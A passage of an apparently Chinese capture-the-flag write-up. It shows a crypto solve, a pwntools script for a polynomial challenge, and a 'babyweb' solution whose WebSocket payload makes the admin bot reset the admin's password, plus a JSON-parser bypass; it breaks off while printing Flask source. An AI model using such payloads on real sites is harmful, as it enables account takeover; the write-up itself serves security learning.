#82AAFF\">p4</span><span style=\"color: #89DDFF\">-</span><span style=\"color: #F78C6C\">1</span><span style=\"color: #89DDFF\">))</span></span>\n<span class=\"line\"><span style=\"color: #82AAFF\">print</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">long_to_bytes</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">pow</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">c</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\"> data</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\"> p2</span><span style=\"color: #89DDFF\">**</span><span style=\"color: #F78C6C\">2</span><span style=\"color: #89DDFF\">*</span><span style=\"color: #82AAFF\">p4</span><span style=\"color: #89DDFF\">**</span><span style=\"color: #F78C6C\">2</span><span style=\"color: #89DDFF\">)))</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">​</span></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\"># flag&#123;Fear_can_hold_you_prisoner_Hope_can_set_you_free&#125;</span></span></code></pre></div><h4 id=\"polydiv\"><a href=\"#polydiv\" class=\"headerlink\" title=\"polydiv\"></a>polydiv</h4><p>第一步考察pwn的使用起到交互作用，第二步在整数环中的多项式乘除法使用sagemath求解，得到数据并进行40轮爆破求解</p>\n<div class=\"language-python\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">python</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF; font-style: italic\">import</span><span style=\"color: #BABED8\"> string</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF; font-style: italic\">from</span><span style=\"color: #BABED8\"> hashlib </span><span style=\"color: #89DDFF; font-style: italic\">import</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">*</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF; font-style: italic\">from</span><span style=\"color: #BABED8\"> pwn </span><span style=\"color: #89DDFF; font-style: italic\">import</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">*</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF; font-style: italic\">import</span><span style=\"color: #BABED8\"> itertools</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF; font-style: italic\">from</span><span style=\"color: #BABED8\"> sage</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #BABED8\">all </span><span style=\"color: #89DDFF; font-style: italic\">import</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">*</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">strs </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> string</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #F07178\">ascii_letters</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">+</span><span style=\"color: #BABED8\"> string</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #F07178\">digits</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">PR </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">PolynomialRing</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">Zmod</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #F78C6C\">2</span><span style=\"color: #89DDFF\">),</span><span style=\"color: #BABED8; font-style: italic\">name</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">x</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">x </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> PR</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">gen</span><span style=\"color: #89DDFF\">()</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #C792EA\">def</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">proof</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8; font-style: italic\">end</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8; font-style: italic\">sha</span><span style=\"color: #89DDFF\">):</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    num</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #F78C6C\">4</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    slist</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\">itertools</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">permutations</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">strs</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #FFCB6B\">int</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">num</span><span style=\"color: #89DDFF\">))</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">for</span><span style=\"color: #BABED8\"> i </span><span style=\"color: #89DDFF; font-style: italic\">in</span><span style=\"color: #BABED8\"> slist</span><span style=\"color: #89DDFF\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        i</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #89DDFF\">&#39;&#39;</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">join</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">i</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">sha256</span><span style=\"color: #89DDFF\">((</span><span style=\"color: #82AAFF\">i</span><span style=\"color: #89DDFF\">+</span><span style=\"color: #82AAFF\">end</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">decode</span><span style=\"color: #89DDFF\">()).</span><span style=\"color: #82AAFF\">encode</span><span style=\"color: #89DDFF\">()).</span><span style=\"color: #82AAFF\">hexdigest</span><span style=\"color: #89DDFF\">()==</span><span style=\"color: #BABED8\">sha</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">decode</span><span style=\"color: #89DDFF\">():</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #89DDFF; font-style: italic\">return</span><span style=\"color: #BABED8\"> i</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #C792EA\">def</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">poly</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8; font-style: italic\">s</span><span style=\"color: #89DDFF\">):</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    fx </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> s</span><span style=\"color: #89DDFF\">[-</span><span style=\"color: #F78C6C\">1</span><span style=\"color: #89DDFF\">]</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">==</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">1</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        fx</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #F78C6C\">1</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">x</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">in</span><span style=\"color: #BABED8\"> s</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">replace</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">x^</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #89DDFF\">&#39;&#39;</span><span style=\"color: #89DDFF\">):</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        fx</span><span style=\"color: #89DDFF\">+=</span><span style=\"color: #BABED8\">x</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">for</span><span style=\"color: #BABED8\"> i </span><span style=\"color: #89DDFF; font-style: italic\">in</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">range</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #F78C6C\">2</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #F78C6C\">15</span><span style=\"color: #89DDFF\">):</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">str</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">i</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">in</span><span style=\"color: #BABED8\"> s</span><span style=\"color: #89DDFF\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            fx</span><span style=\"color: #89DDFF\">+=</span><span style=\"color: #BABED8\">x</span><span style=\"color: #89DDFF\">^</span><span style=\"color: #BABED8\">i</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">return</span><span style=\"color: #BABED8\"> fx</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #BABED8\">io</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #82AAFF\">remote</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">39.107.137.85</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #82AAFF\"> </span><span style=\"color: #89DDFF\">,</span><span style=\"color: #F78C6C\">41366</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">context</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #F07178\">log_level</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">debug</span><span style=\"color: #89DDFF\">&#39;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">io</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">recvuntil</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">sha256(XXXX+</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">message</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\">io</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">recvuntil</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\">\\n</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">)[:-</span><span style=\"color: #F78C6C\">1</span><span style=\"color: #89DDFF\">]</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">end</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\">message</span><span style=\"color: #89DDFF\">[:</span><span style=\"color: #F78C6C\">16</span><span style=\"color: #89DDFF\">]</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">SHA</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\">message</span><span style=\"color: #89DDFF\">[-</span><span style=\"color: #F78C6C\">64</span><span style=\"color: #89DDFF\">:]</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">xxxx</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #82AAFF\">proof</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">end</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\">SHA</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">io</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">sendafter</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">Give me XXXX: </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\">xxxx</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #89DDFF; font-style: italic\">for</span><span style=\"color: #BABED8\"> i </span><span style=\"color: #89DDFF; font-style: italic\">in</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">range</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #F78C6C\">40</span><span style=\"color: #89DDFF\">):</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    io</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">recvuntil</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">r(x) = </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    rx </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">poly</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">io</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">recvuntil</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\">\\n</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">)[:-</span><span style=\"color: #F78C6C\">1</span><span style=\"color: #89DDFF\">].</span><span style=\"color: #82AAFF\">decode</span><span style=\"color: #89DDFF\">())</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    io</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">recvuntil</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">a(x) = </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    ax </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">poly</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">io</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">recvuntil</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\">\\n</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">)[:-</span><span style=\"color: #F78C6C\">1</span><span style=\"color: #89DDFF\">].</span><span style=\"color: #82AAFF\">decode</span><span style=\"color: #89DDFF\">())</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    io</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">recvuntil</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">c(x) = </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    cx </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">poly</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">io</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">recvuntil</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\">\\n</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">)[:-</span><span style=\"color: #F78C6C\">1</span><span style=\"color: #89DDFF\">].</span><span style=\"color: #82AAFF\">decode</span><span style=\"color: #89DDFF\">())</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    bx </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">rx</span><span style=\"color: #89DDFF\">-</span><span style=\"color: #BABED8\">cx</span><span style=\"color: #89DDFF\">)//</span><span style=\"color: #BABED8\">ax</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #82AAFF\">print</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">rx</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\">ax</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\">bx</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    io</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">sendafter</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">&gt; b(x) = </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #FFCB6B\">str</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">bx</span><span style=\"color: #89DDFF\">))</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">io</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">recvall</span><span style=\"color: #89DDFF\">()</span></span></code></pre></div><p><img src=\"/./images/7.png\" alt=\"7\"></p>\n<h3 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h3><h4 id=\"babyweb\"><a href=\"#babyweb\" class=\"headerlink\" title=\"babyweb\"></a>babyweb</h4><p>随手注册一个账号登录后，根据提示发送 <code>help</code> ，返回如下信息</p>\n<p><img src=\"/./images/8.png\" alt=\"8\"></p>\n<p>一开始看到 <code>bugreport</code> 命令（发送 <code>bugreport 网址</code>  管理员会去请求你发送的网址），觉得应该是 <code>XSS</code> 钓管理员的 <code>cookie</code>，但是一直没成功。接收不到请求。</p>\n<p>后来考虑到利用 <code>bugreport</code> 和 <code>changepw</code> 功能修改管理员密码 ，根据页面中的 <code>js</code> ，简单构造 <code>ws</code> 的请求，上传到自己的服务器， 试了半天还是不行，最后考虑到不出网，题目描述里给了 <code>docker</code> 容器映射的端口，所以脚本里的 <code>ws</code> 地址改为 <code>ws://127.0.0.1:8888</code></p>\n<div class=\"language-bash\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">bash</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">docker</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">run</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-dit</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-p</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">0.0.0.0:pub_port:8888</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">babyweb</span></span></code></pre></div><hr>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF\">&lt;</span><span style=\"color: #BABED8\">meta charset=</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">utf‐8</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #BABED8\"> /</span><span style=\"color: #89DDFF\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&lt;</span><span style=\"color: #BABED8\">script</span><span style=\"color: #89DDFF\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">var</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">ws</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">null</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">var</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">url</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">ws://127.0.0.1:8888/bot</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">ws</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">new</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">WebSocket</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">url</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">ws.onopen</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">function</span><span style=\"color: #BABED8\"> (event) </span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">var</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">msg</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">changepw 123456</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">ws.send(msg</span><span style=\"color: #BABED8\">)</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&#125;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&lt;</span><span style=\"color: #BABED8\">/script</span><span style=\"color: #89DDFF\">&gt;</span></span></code></pre></div><p>在对话框里发送 <code>bugreport poc地址</code> ，然后 <code>admin</code>的密码就会被重置为 <code>123456</code>，重新登录 <code>admin</code> 账户<br>购买 <code>Hint</code> 得到题目源码 <code>/static/qwb_source_12580.zip</code></p>\n<p><img src=\"/./images/9.png\" alt=\"9\"></p>\n<p>查看源码发现限制的很死，必须在定义的范围内、必须是数字之类的，最后考虑到 <code>python</code> 和 <code>go</code> 俩语言不同，<code>json</code> 解释器也不同，绕过了限制</p>\n<p><img src=\"/./images/10.png\" alt=\"10\"></p>\n<p>返回页面得到flag</p>\n<p><img src=\"/./images/11.png\" alt=\"11\"></p>\n<h4 id=\"crash\"><a href=\"#crash\" class=\"headerlink\" title=\"crash\"></a>crash</h4><p>访问首页得到题目源代码</p>\n<div class=\"language-python\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">python</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF; font-style: italic\">import</span><span style=\"color: #BABED8\"> base64</span></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\"># import sqlite3</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF; font-style: italic\">import</span><span style=\"color: #BABED8\"> pickle</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF; font-style: italic\">from</span><span style=\"color: #BABED8\"> flask </span><span style=\"color: #89DDFF; font-style: italic\">import</span><span style=\"color: #BABED8\"> Flask</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> make_response</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\">request</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> session</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF; font-style: italic\">import</span><span style=\"color: #BABED8\"> admin</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF; font-style: italic\">import</span><span style=\"color: #BABED8\"> random</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #BABED8\">app </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">Flask</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">__name__</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8; font-style: italic\">static_url_path</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #89DDFF\">&#39;&#39;</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">app</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #F07178\">secret_key</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\">random</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">randbytes</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #F78C6C\">12</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #C792EA\">class</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">User</span><span style=\"color: #89DDFF\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #C792EA\">def</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">__init__</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #F07178; font-style: italic\">self</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #BABED8; font-style: italic\">username</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8; font-style: italic\">password</span><span style=\"color: #89DDFF\">):</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        self</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #F07178\">username</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\">username</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        self</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #F07178\">token</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #82AAFF\">hash</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">password</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #C792EA\">def</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">get_password</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8; font-style: italic\">username</span><span style=\"color: #89DDFF\">):</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> username</span><span style=\"color: #89DDFF\">==</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">admin</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF; font-style: italic\">return</span><span style=\"color: #BABED8\"> admin</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #F07178\">secret</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">else</span><span style=\"color: #89DDFF\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #676E95; font-style: italic\"># conn=sqlite3.connect(&quot;user.db&quot;)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #676E95; font-style: italic\"># cursor=conn.cursor()</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #676E95; font-style: italic\"># cursor.execute(f&quot;select password from usertable where username=&#39;&#123;username&#125;&#39;&quot;)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #676E95; font-style: italic\"># data=cursor.fetchall()[0]</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #676E95; font-style: italic\"># if data:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #676E95; font-style: italic\">#     return data[0] </span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #676E95; font-style: italic\"># else:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #676E95; font-style: italic\">#     return None</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF; font-style: italic\">return</span><span style=\"color: #BABED8\"> session</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">get</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">password</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">@</span><span style=\"color: #82AAFF\">app</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">route</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">/balancer</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\"> </span><span style=\"color: #BABED8; font-style: italic\">methods</span><span style=\"color: 